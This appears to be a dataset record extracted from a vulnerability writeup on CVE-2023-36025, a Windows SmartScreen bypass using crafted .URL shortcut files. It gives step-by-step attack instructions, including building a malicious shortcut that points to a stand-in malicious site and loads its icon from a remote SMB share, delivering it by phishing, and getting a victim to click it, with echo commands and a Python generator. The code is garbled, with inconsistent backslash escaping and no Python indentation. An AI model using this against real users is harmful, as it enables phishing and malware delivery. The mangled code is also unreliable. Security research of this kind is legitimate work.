---
id: c7bd7ae8eeb1
title: "CVE-2023-36025: An In-Depth Analysis of Circumventing Windows SmartScreen Security"
source_url: https://infosecwriteups.com/cve-2023-36025-an-in-depth-analysis-of-circumventing-windows-smartscreen-security-6ff05c8b69d0
author: "Security Lit Limited"
publication_date: 2023-11-18
category: general-web
category_label: "General Web Security"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "penetration-testing"
  - "threat-intelligence"
  - "cybersecurity"
  - "microsoft"
  - "bug-bounty"
tools:
  []
quick_test: "Test if crafted .URL files can bypass Windows SmartScreen warnings by creating and delivering a malicious Internet Shortcut file."
---

## Use case

CVE-2023-36025 is a security feature bypass vulnerability in Windows SmartScreen that allows crafted Internet Shortcut files to bypass security warnings, potentially leading users to malicious websites or executing harmful code. This vulnerability is significant as it can facilitate phishing attacks and malware distribution.

## Steps to test

1. Create a crafted Internet Shortcut file (.URL) with the following content: '[InternetShortcut]\nURL=malicious-website.com\nIDList=\nIconFile=\\\\192.168.1.100\\share\\icon.ico\nIconIndex=1'.
2. Save the file as 'malicious_link.url'.
3. Deliver the crafted .URL file via a phishing email or a compromised website.
4. Instruct the user to click on the .URL file and observe if Windows SmartScreen fails to issue a security warning.

## Commands

```text
echo '[InternetShortcut]' > malicious_link.url
echo 'URL=malicious-website.com' >> malicious_link.url
echo 'IDList=' >> malicious_link.url
echo 'IconFile=\\\\192.168.1.100\\share\\icon.ico' >> malicious_link.url
echo 'IconIndex=1' >> malicious_link.url
[InternetShortcut]
URL=malicious-website.com
IDList=
IconFile=\\\\\\\\192.168.1.100\\\\share\\\\icon.ico
IconIndex=1
def create_malicious_url_file(filename, target_url, icon_path):
with open(filename, 'w') as file:
file.write('[InternetShortcut]\\\\n')
file.write(f'URL={target_url}\\\\n')
file.write('IDList=\\\\n')
file.write(f'IconFile={icon_path}\\\\n')
file.write('IconIndex=1\\\\n')
malicious_url = "<http://malicious-website.com>"
icon_network_path = "\\\\\\\\\\\\\\\\192.168.1.100\\\\\\\\share\\\\\\\\icon.ico"
create_malicious_url_file("malicious_link.url", malicious_url, icon_network_path)
```

## Source

- Author: Security Lit Limited
- Writeup: https://infosecwriteups.com/cve-2023-36025-an-in-depth-analysis-of-circumventing-windows-smartscreen-security-6ff05c8b69d0

_For authorized testing only. Credit the original author._
